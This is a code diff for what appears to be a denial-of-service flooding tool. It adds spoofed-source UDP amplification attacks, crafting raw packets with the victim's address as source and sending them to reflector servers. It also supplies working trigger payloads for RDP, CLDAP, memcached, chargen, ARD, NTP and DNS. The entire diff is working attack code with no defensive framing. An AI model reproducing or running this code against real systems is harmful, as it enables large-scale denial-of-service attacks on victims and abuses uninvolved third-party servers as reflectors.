@@ -10,6 +10,7 @@ from curio import ssl, socket
 from dataclasses import dataclass, field
 from functools import partial
 import json
+from impacket.ImpactPacket import Data, IP, UDP
 from itertools import cycle
 from logging import basicConfig, getLogger
 from math import log2, trunc
@@ -518,6 +519,30 @@ async def flood_packets_gen(
     return packet_sent
 
 
+async def flood_ampl_packates_gen(
+    ctx: Context,
+    fid: int,
+    target: Target,
+    packets: Generator[bytes, None, None]
+):
+    async with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as sock:
+        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        async with curio.meta.finalize(packets) as packets:
+            async for payload in packets:
+                try:
+                    sent = await sock.sendto(payload, (target.addr, target.port))
+                    ctx.track_packet_sent(fid, target, len(payload))
+                    if sent == 0: return
+                except OSError as exc:
+                    if exc.errno == ERR_NO_BUFFER_AVAILABLE:
+                        # typically this happens when there are too many fibers
+                        # which is not necessary for UDP traffic
+                        await curio.sleep(1)
+                    else:
+                        ctx.track_error(exc)
+                        return
+
+
 async def UDP(ctx: Context, fid: int, target: Target):
     """Sends randomly generated UDP packets to the target (UDP port).
 
@@ -542,6 +567,111 @@ async def UDP(ctx: Context, fid: int, target: Target):
                 else:
                     running = False
                     ctx.track_error(exc)
+
+def ampl_packets_gen(reflectors: List[str], target: Target, payload: bytes, ampl_port: int):
+    def gen():
+        for ref in reflectors:
+            packet = IP()
+            packet.set_ip_src(target.addr)
+            packet.set_ip_dst(ref)
+
+            content = UDP()
+            content.set_uh_dport(ampl_port)
+            content.set_uh_sport(target.port)
+            content.contains(Data(payload))
+        
+            packet.contains(content)
+            yield packet
+
+    return cycle(gen())
+
+
+async def RDP(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
+        3389
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def CLDAP(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
+         b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00'),
+        389
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def MEMCACHE(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n',
+        11211
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def CHAR(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(ctx.reflectors, target, b'\x01', 19)
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def ARD(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        b'\x00\x14\x00\x00',
+        3283
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def NTP(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        b'\x17\x00\x03\x2a\x00\x00\x00\x00',
+        123
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
+
+
+async def DNS(ctx: Context, fid: int, target: Target):
+    """
+    Layer: L4.
+    """
+    packets = ampl_packets_gen(
+        ctx.reflectors,
+        target,
+        b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
+        b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
+        53
+    )
+    await flood_ampl_packates_gen(ctx, fid, target, packets)
 
 
 async def TCP(ctx: Context, fid: int, target: Target):
